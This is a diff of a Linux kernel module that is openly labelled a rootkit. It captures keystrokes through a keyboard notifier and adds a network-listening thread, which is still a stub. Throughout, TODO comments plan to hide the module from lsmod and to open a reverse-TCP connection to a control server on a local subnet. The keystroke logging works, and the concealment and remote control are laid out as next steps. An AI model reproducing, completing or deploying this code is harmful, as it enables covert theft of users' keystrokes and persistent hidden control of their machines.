@@ -16,6 +16,7 @@
 #include <linux/semaphore.h>
 #include <linux/keyboard.h>
 #include <linux/syscalls.h>
+#include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/string.h>
@@ -26,18 +27,20 @@
 
 #define SHIFT_ENABLED  1				/* Shift key is enabled.  */
 #define SHIFT_DISABLED 0				/* Shift key is disabled. */
-#define CAPS_ENABLED   1				/* Capslock is enabled.	  */
-#define CAPS_DISABLED  0				/* Capslock is disabled.  */
 
 /**
  * KEYLOGGER FUNCTIONALITY
- * NOTE:
- *   + semaphore could be used to handle keyboard signals safely w/o kernel deadlock.
 **/
 char keyboard_buffer[KEYBOARD_BUFFER_SIZE];
 int  keyboard_index;
 int  shift_state;
 int  caps_state ;
+
+
+/**
+ * NETWORK LISTENING FUNCTIONALITY
+**/
+struct task_struct *net_thread;
 
 
 /**
@@ -58,7 +61,7 @@ char *letters[] =
 
 /**
  * Can be used for uppercase lettering. In other words:
- * Use this whenever SHIFT / CAPS is enabled.
+ * Use this whenever SHIFT is enabled.
 **/
 char *shift_letters[] = 
 {
@@ -98,6 +101,7 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 
 		if (param->down)
 		{
+			// If the shift key is being held down.
 			if (shift_state) 
 			{
 				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", shift_letters[param->value]);
@@ -110,6 +114,7 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 				key = letters[param->value];
 			}
 
+			// Add each letter in the string returned by key_notifier to the buffer. 
 			buffer = keyboard_buffer;
 			for (i = 0; i < strlen(shift_letters[param->value]); i++)
 			{
@@ -144,29 +149,52 @@ static struct notifier_block nb =
 
 /**
  * TODO:
+ *   - Add network-listening functionality.
+ *   - Filter out "ACK" numbers from TCP packets.
+**/
+int start_listen(void *args)
+{
+	printk("This prints.\n");
+
+	return 0;
+}
+
+
+/**
+ * TODO:
  *   - Hide the module:
  *     + Option1:  Overwrite "lsmod"
  *     + Option2:  Delete module listing "rootkit" from modules.
- *   - Create thread(s) for:
- *     + Network traffic listening.
+ *   - Configure rootkit to be a client.
+ *     + Will connect to the control-server on the 192.168.1.0/24 subnet.
+ *     + This connection is, thus, a reverse-TCP connection.
 **/
 int start(void)
 {
-	printk("Started.\n");
-	printk("Registering keyboard notifier.\n");
+	printk("Rootkit started.\n");
 
+	printk("Registering keyboard notifier.\n");
 	register_keyboard_notifier(&nb);
 	keyboard_index = 0;
+
+	printk("Starting network-listening thread.\n");
+	net_thread = kthread_create(start_listen, NULL, "network_listener");
+	wake_up_process(net_thread);
+
+	printk("Stopping network-listening thread.\n");
+	kthread_stop(net_thread);
+	printk("Network-listening thread stopped.\n");
 
 	return 0;
 }
 
 void stop(void)
 {
-	printk("Stopped.\n");
 	printk("Unregistering keyboard notifier.\n");
-
 	unregister_keyboard_notifier(&nb);
+	printk("Keyboard notifier unregistered.\n"); 
+
+	printk("Rootkit stopped.\n");
 }
 
 module_init(start);
